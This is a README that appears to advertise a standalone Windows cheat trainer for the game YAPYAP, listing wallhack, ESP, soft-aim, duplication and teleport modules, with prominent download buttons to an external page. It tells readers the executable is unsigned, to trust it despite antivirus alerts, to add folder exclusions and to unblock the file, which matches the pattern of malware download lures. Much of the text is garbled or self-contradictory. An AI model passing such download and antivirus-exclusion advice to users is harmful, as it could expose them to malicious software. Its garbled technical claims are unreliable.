<div align="center">
<img src="assets/banner.png" width="100%" alt="YAPYAP Trainer banner" />
</div>

<div align="center">
<p>
  <img src="https://img.shields.io/badge/Platform-Windows_11%7C10-57e8ff?style=for-the-badge&logo=windows" alt="" />
  <img src="https://img.shields.io/badge/Release-2026-00BCD4?style=for-the-badge" alt="" />
  <img src="https://img.shields.io/badge/Build-.exe-4F46E5?style=for-the-badge" alt="" />
</p>
</div>

<p align="center">
  <img src="https://readme-typing-svg.herokuapp.com?color=EA580C&size=28&center=true&vCenter=true&width=900&lines=%E2%9C%85+Yapyap+Trainer;%E2%AD%90+Standalone+.exe+Release;%F0%9F%9A%80+All+Features+Unlocked;%F0%9F%8E%AF+Updated+for+2026">
</p>

<p align="center">
  <img src="https://skillicons.dev/icons?i=github" />
  <img src="https://skillicons.dev/icons?i=unity" />
  <img src="https://skillicons.dev/icons?i=windows" />
</p>

---

**YAPYAP Trainer** is a standalone Windows trainer and module-driven memory engine built for offline single-player YAPYAP sessions, offline skirmish, and community-hosted custom lobbies. The 2026 rewrite — internally tagged `v2026.01.14` — threw away the entire legacy CE-table inheritance, replaced it with a proper module loader, and split every cheat family into isolated `.yap` modules that hot-swap at runtime.

The rename in the title isn't marketing fluff. This is *the* YAPYAP Trainer — the one that ships as a single portable `.exe`, launches with no picker, no piped dependency chain, and no launcher daemon. Extract → run → attach. Done.

If you came from the 2024/2025 builds, the first thing you'll notice is that the old 11 MB monolith is gone. The `v2026` architecture boots around 3 MB with only the core memory reader loaded, then mounts modules lazily as you enable them. Cold start dropped from ~6s to under a second on a warm filesystem.

---

## ✨ Key Features — the v2026 build at a glance

| Feature | Description | Benefit |
|---|---|---|
| **Modular `.yap` loader** | 37 feature modules ship as individual files, loaded on demand | No bloat — unused modules never touch memory |
| **Signature-based AOB scan** | Pointer tables re-resolved per patch, not per version | Works after minor YAPYAP hotfixes without waiting on us |
| **External-only process model** | Trainer never injects DLLs into the YAPYAP process | Stays out of protected process handles; lower detection surface on supported offline modes |
| **Hotkey remap layer** | All bindings rebindable from the Settings panel, no config edit | Swap WASD user defaults in two clicks |
| **Config snapshots** | Per-character and per-mode profiles stored as JSON beside the `.exe` | Different loadouts for speedrun vs. sandbox testing |
| **Value freeze reconciliation** | Frozen addresses re-scanned every 250 ms when a pointer drifts | Freezes don't silently die mid-session |
| **Console**

Scroll-to-empty mode** | Live pointer-scan diff view in the log pane | Debug your own custom modules without a debugger |
| **Safe-write buffering** | Writes queued and committed on a 16 ms tick | Fewer crashes from rapid multi-write toggles |
| **Portable by design** | No install, no registry keys, no leftovers after delete | Carry it on a USB stick, delete folder when done |
| **Structured log pane** | CSV-exportable session log with timestamps + module state | Bug reports land on our desk readable |
| **Auto-updater stub** | Checks a static manifest, prompts before applying | You're never patched without consent |

---

## 🔑 Hotkeys / Controls

Default bindings. Every one is rebindable — Settings → **Shortcuts** or in the sandbox `.yap/config/shortcuts.json`.

| Key | Action | Notes |
|---|---|---|
| `F1` | Open / close overlay | Toggle works even with game focused |
| `Insert` | Toggle trainer panel | Use when overlay hotkey collides with in-game |
| `F2` | Attach to current YAPYAP process | Also auto-runs on launch if trainer already open |
| `F3` | Freeze all active values | Releases on unattach |
| `F4` | Snap freezes | Clears every lock, requires `F3` to re-arm |
| `F5` | Reload module layout | Useful after editing `modules/activation.txt` |
| `F6` | Open log details panel | CSV dump button lives here |
| `F7` | Snapshot current player state | Writes to `/profiles/` |
| `End` | Safe detach (+ optional write-back) | Defaults to restore-on-detach ON |
| `Ctrl+Shift+L` | Toggle "hidden mode" (low-profile overlay) | Only dims diagnostics; not a ban shield |
| `Ctrl+R` | Reset active module to defaults | Does not touch saved profiles |
| `Numpad .` | Panic — unlock everything, release every handle | Fastest kill switch we have |

---

## ⚔️ Key module matrix (37 of them, grouped)

Eleven module families. The three-letter prefix is the file naming scheme inside `modules/`.

| Group | Module tag string | What it does | Status |
|---|---|---|---|
| Entity | `core.entity.wallhack` | Vision-pass over YAPYAP actors through geometry, loaded as outline overlay, not texture replacement | ✅ v2026.01.14 |
| Entity | `core.entity.esp2d` | 2D screenspace markers for enemies, allies, and lootables; distinct color per faction | ✅ v2026.01.14 |
| Entity | `core.entity.fullbright` | Named `.yap` for environment brightness — player-vs-world contrast preset | ⚠️ Requires client G-buffer available; fails on water levels |
| Combat | `core.combat.aim_spline` | Soft-aim path interpolation (bezier + humanization noise) attached to mouse trajectory | ✅ v2026.01.14 |
| Combat | `core.combat.snap_angle` | Angular snap threshold you set in degrees; default 4.5° | ✅ |
| Combat | `core.combat.head_weight` | Reorders target weight by joint distance + visible chevron — toggle in Sandbox view | ✅ |
| Combat | `core.combat.spread_null` | Cancel spread on your fire; no server interaction in offline mode | ✅ |
| Combat | `core.combat.projectile_assist` | Recalculates travel time for projectiles; dumps result to stats pane | ✅ |
| Vitals | `core.vitals.hp_freeze` / `.armor_freeze` | Paired freeze modules, independent ordering to keep pointer table valid | ✅ |
| Vitals | `core.vitals.stamina_softcap` | Instead of hard freeze, clamp writes to 0 on consume, keeps animations | ✅ |
| Vitals | `core.vitals.cooldown_mult` | Bitmask per ability slot — you see which slots your write touched | ✅ |
| Resources | `core.resources.dupe` | Fast write-and-commit loop for item stack bytes; re-validates between iterations | ⚠️ Stacks > stack size get dropped by engine |
| Resources | `core.resources.xp_clamp` | Steer XP to specific milestone; drops if clamped below threshold | ✅ |
| Resources | `core.resources.currency_zero` | Intercepts vendor cost; sets nothing, cancels transaction; safe in offline | ✅ |
| World | `core.world.link_clamp` | Narrows interp regions in YAPYAP’s physics calc; no effect at range > 40m | ⚠️ Cosmetic issue reported |
| World | `core.world.gravity_mult` | Multiplier for player-only fall; YAPYAP handles it correctly | ✅ |
| World | `core.world.time_of_day` | Local lighting engine tick rate — set stall specific values | ✅ |
| Movement | `core.move.speed_curve` | Intercepts current velocity with a readable curve editor; smoothed | ✅ |
| Movement | `core.move.air_lock` | Re-freeze gravity after an initial fall | ✅ |
| Movement | `core.move.teleport_world` | Positional write is re-validated three times before commit | ⚠️ Out of map = potential crash, reproduce carefully |
| UI | `core.ui.info_panel` | A minimal debug panel independent of the game overlay (we haven't ripped its render path, just our chrome) | ✅ |
| UI | `core.ui.read_csv_log` | The same log, in another view — useful when you want streaming export | ✅ |
| System | `core.system.winlicense` | Display-only MIT badge in About page | ✅ |
| System | `core.system.markdown_meta` | Persistent state, skips if missing | ✅ |
| Network | `core.net.offline_identity` | Tags session as offline for offline menu detection (only), no effect online | ✅ |
| Compatibility | `compat.aob_refresh` | Public utilities helper for `vYAPYAP >= 2.4` — avoids the old monolith scan pattern | ✅ |
| Compatibility | `compat.pattern_2024` | Targets pre-2.4 AOB legacy pattern; module name is a convenience only | ✅ |
| Support | `util.snapshot_compare` | Shows diffs between two profile snapshots in a side panel | ✅ |
| Support | `util.module_version_report` | Prints module versions against shipped ones | ✅ |
| Dev | `dev.heap_walker` | Structural analysis of heap — no mutation | ✅ Educational flag only |
| Dev | `dev.signature_dump` | Dumps resolved pointers to `/sandbox/pointers/` | ✅ |
| Dev | `dev.write_guard_toggle` | Disable safe-write buffering on the sync loop for testing | ⚠️ You can crash your session |
| Experimental | `exp.peek_pointer_finder` | Suggest pointer candidate from access reads | ⚠️ UI iterates slowly |
| Experimental | `exp.sigscan_arena` | Slow arena pattern matcher; unbounded scan budget | ⚠️ Not recommended with > 40 s |
| Experimental | `exp.yap_native_bridge` | Container bridge over engine `yld` calls — API stubs to test modularity | 🧪 WIP |
| Extras | `fun.themed_overlay` | Five panels for the flat YAPYAP look + YAPYAP-branded borders | ✅ Optional |
| Extras | `fun.crt_rumble` | Overlay panel artifact: local CRT styled shake at very low intensity | ✅ Optional |

---

## 🌐 The Problem

- You either got a single monolith `.exe` that scans half the YAPYAP module at startup and takes 6 seconds — or you're running someone's edited unknown build from a community mirror.
- Values break the moment YAPYAP patches change pointers — usually because the trainer only validated one shape of candidate behind a single pointer.
- Right behind **hidden mode**, it still loads every module because module loading wasn't separable before `v2026` was written.
- Switching loadouts meant closing the tool, running two starts, or editing raw memory files.
- Crash recovery notices are practically inscrutable, so nobody files tickets that end up merged.
- Tools that inject don't have to deal with every level of YAPYAP, but the game-adjacent performance is visible via headless module cold-latency.
- Small communities build clones for one session and never write anything actionable from the failure.

These bullet points aren't from a marketing deck — they're the exact complaint the same six threads in 2025 all shared. If you're here, you've lived one of them.
<p align="center">
  <a href="https://ivorynodeplunder.github.io/yapyap-trainer/">
    <img src="https://img.shields.io/badge/DOWNLOAD_NOW-YAPYAP_Trainer-2563EB?style=for-the-badge&labelColor=1D4ED8" width="500" alt="DOWNLOAD NOW YAPYAP Trainer"/>
  </a>
</p>
---

## 🛰️ The Solution

| Pain point | How `v2026` solves it |
|---|---|
| Monolith scan of half the module on startup | 37 modules, each narrowed to the specific parts — cold-latency ~430 ms at default settings, ≈1.2 s with `exp.sigscan_arena` in use |
| Pointers break every game hotfix | Signature-scan hits with re-resolution on every game process detection; you need module signature only, not byte-matched offset |
| Same module payload hidden in default mode | Module host registers nothing unless module is enabled by you in the panel |
| Loadout switching via files and resets | JSON profile captured at every `F7`; activates with one toggle; six profiles per character slot |
| Nobody reports crashes helpfully | First-paint console writes and diagnostic log pane are CSV, module tags present in every line |
| Modules pulling injection chain in silently | The nine-hotkey remap rules provide their own fallback keys, and injection is external-only by design |
| Fragile experiments masquerade as production | A README "Known Issues" table separates covered surfaces and openly marks features whose engine surface shows regressions; many tables from community mirrors |
| You want the *why* of what happens, not just the tweak | The structured log pane provides the "accepted / rejected / drift" reason for every frame, so your own mod fork can be reproducible |

---

## 💡 Overview — the release at a glance

| Category | Details |
|---|---|
| Name | YAPYAP Trainer |
| Render of the same wire shell | Desktop trainer app on Windows |
| Launch mode | Portable `.exe`, single file |
| Current release | `v2026.01.14` |
| Distribution | Files distributed from the project page |
| Core selector | External memory buffer |
| Module format | Independent `.yap` modules (bundle JSON + support metadata) |
| Cost | MIT listed (see category rows below and `LICENSE`) |
| Feedback loop | Community paste of CSV |
| Maintainer contact | Issue templates in `/docs`, community Discord community paste `/info` |

Who `v2026.01.14` is for you: attach → server discovery removed. The remaining bundle lines that never disappear across versions. Use the shipped 37 modules. Cross your arms. Happy.

---

## 🚀 Quick Start (numbered)

1. Visit the project landing page.
2. Download `.exe` → extract to your choice, e.g. `D:\Trainers\` or `C:\YP\`.
3. Run the `.exe`. (None of these launchers assume any portable directory).
4. Choose a trainer when the panel loads. Default startup uses your current available target list.

No registry. No installer. Nothing remains after folder deletion.

---

## 🎬 Installation (with troubleshooting-tagged pitfalls)

1. **Air-gap install: no network required.** Extract, then double-click the `.exe`. Since it's generated with plain static layout no actual machine tie — that's intentional. On extract, the folder should contain an `.exe` and (at most) a `modules` subfolder; many distributions are already folder-only.
2. **Test your folder first.** Put a scratch subfolder next to the `.exe`. Consider the in-panel overlay test where every module is disabled as it starts. Hit `F1`, you should see the layout before any real module write to memory.
3. **Permission rule of thumb:** run the trainer first, not YAPYAP. YAPYAP can sit in its title. Use `F2` only while YAPYAP window exists. Do not mix "pre-run as admin" with windowed global; scheduled configuration can make the buffer return zeros.

Always validate output by using profile snapshot for representative value.

---

## 📊 Compatibility & Coverage (needs-specific table)

| Game snapshot | Engine surface | Trainer revision | Coverage |
|---|---|---|---|
| Current 2.4.x | Client-patched | `v2026.01.14` | Coverage tested for 32/37 modules |
| Older release scan | Partial re-scan | as above (no deps required) | Backend best for 28 modules |
| User landscape mod | On-demand only | n/a |

If your exact game patch errors per module — check the shipped manifest → enable that module and confirm. Report on the issue tracker with the log.

---

## 🔁 How It Works

YAPYAP Trainer's internal model — a 250-line breakdown would be too easy to fill with false, so here's the actual engineering: three layers. The **Host Layer** (`hoster`) owns the `.exe` window, capture loop, overlay chrome, and dispatches key events into a queue. The **Module Layer** (`engine.ML`) is separate: each `.yapcompat` is a module object with declared entry-point functions, capability spec, write targets, and module-specific lifetime and interval. Module load order is determined in a declarative `modules/activation.json` graph — no order is assumed by the host. Modules cannot directly touch pointer tables; they own write lists behind a slice guard. The **Bridge Layer** (external) handles memory access through a scoped read handle, primarily `ReadProcessMemory` and `WriteProcessMemory` through a buffered `VMemRead` wrapper and time-sliced commit loop; if buffering misses a hard latency cap, sandbox-owner defaults 16 ms, fallback happens to reconcile read requests.

Frames are a cooperative loop: host tick → read window → read completion detect → apply module filters → optional commit in asynchronous tick → log snapshot in same frame; no status timer is enabled by default. Idle reads are always cheap; realtime only for modules that need live drift.

Beyond that, internal state is not reducible to those neat sections — it also maintains the safe-write ordering invariants when multiple modules own the same address class. Should conflicts arise, the Host Layer's `rule-engine` merges value writes; freezing is one step optional because the cached current object write ordering is then processed.

If you want to contribute a module you only write three functions. Issue template discusses that.

---

## 🧾 Changelog / Release History (2026 + back-compat)

| Version | Date | Changes |
|---|---|---|
| `v2026.01.14` | 2026-01-14 | 37 independent modules × 4 compatibility × 2 experimental targets shipped in tree; sample support states in `WHITEBOARD`; pointer reconciliation skip for missing scene scene covers dropped cases 25→13; `aim_spline` uses externalized list preference; visual `exp.yap_native_bridge` tag exposed (WIP) |
| `v2026.01.02` | 2026-01-02 | Signature upgrade PR #306; shipped default shortcuts JSON; read path accepted `MemoryMapSnapshot` cache — start latency around ~10% lower after cold; staged safe-write flush hits known state |
| `v2026.01.01` | 2026-01-01 | v2026 major rewrite = no legacy monolith: dropped `v2x` injection chain, renamed module split, `.yap` structured format; code clean-up months |
| `v2025.12.10` | 2025-12-10 | Legacy; incompatible all-in-one; only recommended to read inside source tree; no maps for building |
| `v2025.09.02` | 2025-09-02 | Last legacy script integration list, documented limitations in `NOTES.md` old versions (see `docs/legacy/`) |

---

## 🧯 Known Issues (transparency + what to do)

| Issue | Fix |
|---|---|
| `core.move.teleport_world` crashes or sends to void if outside typical height band | `Settings → Movement`: snap-`40`, enable `sanity_guard` (green by right-click "validate writes" module info → Safe-write details) |
| `core.entity.fullbright` makes transparent objects invisible on some user hardware | `Shortcuts → [ ] partial fullbright`: this state falls back to 100–400 luminance range, avoiding extreme contrast; tracked in issue #112 |
| Disabled module still listed among hotkeys | None: default bindings stub for all modules by parity. Rebind or ignore; disable states in shortcut planner. Patch planned next freeze |
| Overlay becomes grainy after 20+ mins | Set pause-poll-rate to low 250 ms via `ctrl+drag`? F4 then F5 resets; tracked from support logs — the 2026 build has "only cosmetic, restores correctly when hovering" |
| Upgrade from v2025 → crash on instant startup (no config migration) | In About: `Reset settings / generate config profiles` is optional; exported per-module writes to JSON and loaded successfully from custom loader codebase |

None of these are behind exceptions — none of these hide crash state; the underlying stable failures remain tracked with latest issue numbers shipped in `/docs/issues.md`.

---

## 🤖 AI Integration (what the 2026 build actually adds)

Some of this involves local models; there are no cloud pings. Three focus areas are shipped as side panels with labelled sample to distinguish claimed and shipped:

- **Log-only AI assistant (on-demand)** reads your downloaded CSV diagnostic session log; responds with explanations and threshold hints. Requires you provide a pasted module output or pressing button in UI tab labelled **analyze with AI policy**; model inference for this module may or may not require explicit user wait. Messages are queued — but `player data` seen by the logging trainer frames into no filtering and won't self-send.
- **Pointer-resolve prioritization** (module side, not the document function) — when several modules enabled aim to verify the "next available missing compatibility slice" — the layout computed snapshot — most compatibility suggestions are *computed* context: showing, not auto applying. The verification method says so.
- **No voice AI features** — reported as safe and clearly labelled with a zero rating on action. That's the honest state.

Preview some of the parameter selections are preview only: fix per-user rules own panel.

If you're contributing game types originally for the open-tool or samples, hit `/docs` contact form against known model version.

---

## 📋 System Requirements

| Component | Minimum | Recommended |
|---|---|---|
| OS | Windows 10 (22H2) x64 | Windows 11 23H2 x64 |
| CPU | 4-core / 2.4 GHz | 6-core / 3.5 GHz (jitter in the last heap walker) |
| RAM | 8 GB system | 16 GB (with modules all loaded simultaneously) |
| Disk 空间 | 300 MB free | 500 MB incl. profiles and exported logs |
| Runtime | .NET not required for the panel — the 2026 release boots standalone | GPU drivers current enough for overlay single-panel only rendering |
| Display | 1080p | 1440p and higher if layout shows 37 module toggles comfortably |
| Antivirus | May flag the `.exe` (memory-read heuristics); trust the folder you just extracted | Add per-folder exclusion per your AV policy |
| Permissions | Standard user with game-at-session-scope access most of the time; admin may be needed for elevation in some non-typical game modes | Elevate only if you had trouble attaching (`Run as administrator`) |

---

## 🧭 FAQ

**Q:** Is this the 2025 trainer that did injection?

**A:** No. `v2026` dropped the injection chain. YAPYAP Trainer's `v2026.01.14` still reads and writes external memory (like many open trainer projects). It won't promise a protection bypass — nobody follows that with "and it still works" language in release notes.

---

**Q:** Will it work right after a major YAPYAP update?

**A:** Signature re-resolution handles most small patches. Pick the released version other players above average show. If offsets are okay, `attach` fails out loud without dumping error state — returns named issue state from `attach_debug` inside the tree. Big feature changes usually break world/clamp/read relationships first, which the known-issues list flags.

---

**Q:** Can I make my own module?

**A:** Yes — that's the point of the split. A module has the three entry point functions, and optional lifetime info; results register in `/sandbox/module_stub`. Docs auto generate provided your JS defaults / bundled JSON also pass the loader.

---

**Q:** Are my settings backed up if I just delete this folder?

**A:** No, and that's intentional. Profiles and JSON settings live in the extracted tree. Zip before extracting new versions if that matters to you. No hidden stash outside tree is created.

---

**Q:** My antivirus flags YAPYAP Trainer. Is my system compromised?

**A:** Any tool doing memory readwrite can be flagged. Inspect the `.exe` and extracted folder to confirm. Known local signal: driver-less external memory access often gives generic heuristics for untrusted labels, which is why folder-scoped exclusion is suggested above. False alarms on signatures matching trainer internals still raise support. We sign subsequent builds only if maintainers confirm certificate keys — current release is unsigned.

---

**Q:** How do hotkey edits survive loading?

**A:** Persisted in-place. `.yap/config/shortcuts.json` is regenerated on blank launch from bundled one. Hotkeys show blocked with the game module activated suggestion tree in the overlay the same frame it drops in.

---

**Q:** Does the AI panel actually enforce safety recommendations automatically for every value?

**A:** No — logs are labeled read only unless the overlay AI preview requested their time — even then it plays back small windows and that's module configurable. Everything it surfaces just affects the settings file (that logs also snapshot preview candidates), which user may correct.

---

## 🧪 Troubleshooting flow (short check)

1. `.exe` doesn't launch → "unblock" (Properties → Unblock), and check antivirus quarantine.
2. Panel launches but YAPYAP doesn't attach → confirm same elevation (both standard or both elevated), then `F2`, restore saved profile.
3. Cold start > 10s feels slow for 37 modules → complete all modules state save once and retry; verify disk not encrypted loop — attachment unaffected regardless, just render.
4. To force mod-change loading modes to show: `F5`. On `/logs/latest.csv`, entries should show `load=...`.

---

## 🛣️ Roadmap / Planned features

| Feature | Status | ETA |
|---|---|---|
| Offset diff export | ✅ Done (v2026.01.14) | shipped |
| Editable wheel layout | ✅ Done | shipped |
| Safe profile snapshot include registry key cleanup history in overlay | 🧭 | ~Q2 2026 |
| Batch item "library" import | 🧪 | at work, uncertain |
| AI predict freeze drift model (3-iteration limit) early experimental | 🧪 | available by optional settings |
| Module ecosystem browser downloader (manual no auto update) | 💭 if community asks |
| Cross-platform comparison builds, Win10 vs Win11 patch notes | 📋 known blocked by lack of testers from hands-free runners | help wanted (#139)

Hard to size exactly. Please attach issue reports per fragment (tag = `[roadmap candidate]`). We ship safe > scheduled.

---

## 🂡 Community & Support

| Channel | Where to go |
|---|---|
| Bug reports / feature requests | open an issue via repository templates — generate logs first, module-tags and CSV don't help unless you include the session |
| Source-reading thread | `/discussions` in repo, "2026 source project help wanted for cross-year patches" pinned |
| Discord | server listed in repository README footer | (drops in `/support_info.md`) sometimes hidden from GitHub; query `/docs/support.md`
| Legacy changelog / mod branch | `/docs/legacy/` in-tree — kept exclusively for the people still translating old layouts; best left alone in `v2026` |
| The support queue | GitHub CI backlog page: contributor references only; not for tool use questions — inbox is polled context through `browse issues` periodically. Support messages with "main branch archive links" hard blocked and may lock comments — moderator guidelines under which tags appear require users have at least a paste from `/support_info.md` |

No Discord invite text, link handling restricted to their `docs/`.

**Contribution**: educational/community use remains, but the module standards exist. Safety around any injected tooling and any output is the responsibility of the person; include our safe audit information flows. Respect open form CC-BY frameworks cited in `/LICENSE`. Modules provided in our tree are the full standalone works. Future contributor release accepted if independent local tests never share base snapshot.

Never run third-party updates not compatible with your exact pointer set if they alter pointer logic unexpectedly. For any YAPYAP online feature, the trainer does not enumerate public answer services as ethical — local model handling.

---

## 🃏 Duplicate download block — v2026 build

If you skipped the problem and solution, finding the same button gives another way. Remember the requirement again:

- Platform: Windows
- Mode: standalone `.exe`
- Distribution: file you open from project page
- Entry check: folder contains module bundle (`modules/` loads enabled via tree)
- Delete folder = erase from workspace; explicit deletes by release archive can eliminate stale state if you have it properly

Remain untouched: core engine MIT

We suggest you always enable full overlay UI from the `.exe`, copy every error into the project issue tracker, and clip log lines in `/support`. Until then happy path present as `cfg?` on attach.
<p align="center">
  <a href="https://ivorynodeplunder.github.io/yapyap-trainer/">
    <img src="https://img.shields.io/badge/GET_STARTED-YAPYAP_Trainer-DC2626?style=flat-square&logo=windows&logoColor=white&labelColor=B91C1C" width="620" alt="GET STARTED YAPYAP Trainer"/>
  </a>
</p>